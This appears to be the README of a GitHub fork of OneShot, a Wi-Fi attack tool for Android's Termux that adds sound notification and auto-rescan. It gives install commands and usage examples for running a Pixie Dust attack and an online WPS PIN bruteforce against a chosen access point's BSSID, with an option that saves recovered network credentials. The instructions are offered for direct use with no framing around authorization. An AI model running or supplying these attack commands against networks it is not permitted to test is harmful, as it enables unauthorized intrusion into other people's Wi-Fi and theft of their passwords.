# OneShot for Termux with vibro/sound notification and 10 seconds delay between autorescan

## FIRST!
```
pkg install play audio
```
## Sound notification file can be changed in 1024 line (default is knock.ogg)
https://github.com/jevgenyonegin/OneShot_Notification-Autorescan_Mod/blob/c9b4088fa1abc027294d4d58712934318b16446f/oneshot.py#L1024

## Delay can be changed in 1039 line (default is 10)
https://github.com/jevgenyonegin/OneShot_Notification-Autorescan_Mod/blob/c9b4088fa1abc027294d4d58712934318b16446f/oneshot.py#L1039
Use termux wakelock option to keep running with screen off!

# Overview
**OneShot** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
# Features
- oneshot.py - based on drygdryg
project with notification and rescan
- oneshot1.py - without rescan 
- oneshot2.py - vilvius31 mod, using bases of known MAC&Pins with notification 
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner with highlighting based on iw;
# Requirements
 - Python 3.6 and above;
 - [Wpa supplicant](https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps](https://github.com/wiire-a/pixiewps);
 - [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw).
# Setup

## [Termux](https://f-droid.org/en/packages/com.termux/)
Please note that root access is required.  

**Installing requirements**
 ```
 pkg install -y root-repo
 pkg install -y git tsu python wpa-supplicant pixiewps iw openssl play-audio
 ```
**Getting OneShot**
 ```
 git clone --depth 1 https://github.com/jevgenyonegin/OneShot_Termux_mod OneShot
 ```
#### Running
 ```
 sudo python OneShot/oneshot.py -i wlan0 --iface-down -K
 ```

# Usage
```
 oneshot.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --pbc                    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 oneshot.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try run the following:
```
sudo chmod 644 /dev/wmtWifi
sudo sh -c 'echo 1 > /dev/wmtWifi'
```
# Acknowledgements
## Special Thanks
* `rofl0r` for initial implementation;
* **`drygdryg` for developing OneShot**;
* `Monohrom` for testing, help in catching bugs, some ideas;
* `Wiire` developing Pixiewps;
* **`eda-abec` for vulwsc updates and support**;
* `vilvius31` for project support;
